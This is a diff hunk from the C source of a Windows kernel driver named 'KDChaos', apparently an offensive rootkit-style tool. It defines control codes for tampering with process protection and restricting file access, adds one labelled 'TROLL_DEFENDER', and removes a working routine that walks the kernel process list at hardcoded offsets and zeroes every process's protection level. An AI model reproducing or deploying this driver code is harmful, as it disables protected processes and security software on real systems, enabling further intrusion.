@@ -21,59 +21,22 @@
 #define PROTECTION_LEVEL_AUTHENTICODE_LIGHT CTL_CODE(FILE_DEVICE_UNKNOWN,0x99,METHOD_BUFFERED ,FILE_ANY_ACCESS)
 #define UNPROTECT_ALL_PROCESSES CTL_CODE(FILE_DEVICE_UNKNOWN,0x100,METHOD_BUFFERED ,FILE_ANY_ACCESS)
 #define RESTRICT_ACCESS_TO_FILE_CTL CTL_CODE(FILE_DEVICE_UNKNOWN,0x169,METHOD_BUFFERED ,FILE_ANY_ACCESS)
+#define TROLL_DEFENDER CTL_CODE(FILE_DEVICE_UNKNOWN,0x1645,METHOD_BUFFERED ,FILE_ANY_ACCESS)
 
 UNICODE_STRING DeviceName = RTL_CONSTANT_STRING(L"\\Device\\KDChaos");
 
 UNICODE_STRING SymbName = RTL_CONSTANT_STRING(L"\\??\\KDChaos");
 
-char* PsGetProcessImageFileName(PEPROCESS Process);
+const char* PsGetProcessImageFileName(PEPROCESS Process);
 
 EX_PUSH_LOCK pLock;
 
+wchar_t* to_free;
 typedef struct foperationx {
     int rpid;
-    char filename[MAX_PATH];
+    wchar_t filename[MAX_PATH];
 }fopera, * Pfoperation;
 
-
-DWORD UnprotectAllProcesses() {
-    PVOID process = NULL;
-    PLIST_ENTRY plist;
-    __try
-    {
-
-        NTSTATUS ret = PsLookupProcessByProcessId((HANDLE)4, (PEPROCESS*)&process);
-        if (ret != STATUS_SUCCESS)
-        {
-            if (ret == STATUS_INVALID_PARAMETER)
-            {
-                DbgPrint("the process ID was not found.");
-            }
-            if (ret == STATUS_INVALID_CID)
-            {
-                DbgPrint("the specified client ID is not valid.");
-            }
-            return (-1);
-        }
-
-        plist = (PLIST_ENTRY)((char*)process + 0x448);
-
-        while (plist->Flink != (PLIST_ENTRY)((char*)process + 0x448))
-        {
-            DbgPrint("Blink: %p, Flink: %p\n", plist->Blink, plist->Flink);
-
-            ULONG_PTR EProtectionLevel = (ULONG_PTR)plist->Flink - 0x448 + 0x87a;
-
-            *(BYTE*)EProtectionLevel = (BYTE)0;
-
-            plist = plist->Flink;
-        }
-    }
-    __except (EXCEPTION_EXECUTE_HANDLER)
-    {
-        return (-1);
-    }
-}
 
 DWORD write_to_read_only_memory(void* address, void* buffer, size_t size)
 {
